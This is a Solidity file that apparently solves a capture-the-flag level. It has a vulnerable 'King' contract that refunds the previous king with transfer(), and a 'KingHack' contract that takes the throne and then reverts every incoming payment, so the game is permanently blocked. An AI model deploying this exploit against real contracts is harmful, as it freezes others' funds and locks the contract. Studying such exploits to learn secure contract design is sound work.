// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingHack {
    address payable private immutable _target;

    constructor(address payable _kingAddr) payable {
        _target = _kingAddr;
    }

    function becomeKing() external returns (bool) {
        (bool success, ) = payable(_target).call{value: address(this).balance}("");
        return success;
    }

    receive() external payable {
        revert("Hack");
    }

    fallback() external payable {
        revert("Hack");
    }
}

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}